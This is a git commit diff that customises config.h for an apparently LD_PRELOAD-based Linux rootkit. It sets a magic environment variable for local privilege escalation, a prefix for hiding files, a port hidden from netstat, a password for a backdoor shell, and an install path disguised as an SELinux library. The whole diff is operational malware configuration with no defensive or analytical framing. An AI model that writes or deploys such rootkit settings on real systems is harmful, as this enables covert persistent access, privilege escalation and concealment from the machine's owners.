ff0bc6ff1341213e70e2dc579b90f4868af6ea6d
Davide Rusconi <daviderusconi1@gmail.com>
2022-04-02 17:51:18 +0200

    customizd config.h

--- src/config.h
+++ src/config.h
@@ -10,19 +10,19 @@
 #define EPOCH_TIME 0000000000
 
 /* magic environment variable for Local Privilege Escalation (LPE) */
-#define ENV "lobster"
+#define ENV "3sc4l4t3"
 
 /* magic prefix for hidden files */
-#define STRING "lobster"
+#define STRING "h1d3_"
 
 /* name to hide for files */
-#define PRELOAD "ld.so.preload" // used for hiding
+#define PRELOAD "ld.so.preload.useless" // used for hiding
 
 /* port to remove from netstat output, etc */
 #define HIDDENPORT "D431"
 
 /* password for accept() backdoor shell */
-#define SHELL_PASS "lobster"
+#define SHELL_PASS "password"
 
 /* location of rootkit on disk */
 #define INSTALL_LOCATION "/lib/selinux.so.3" // used for reinstallation
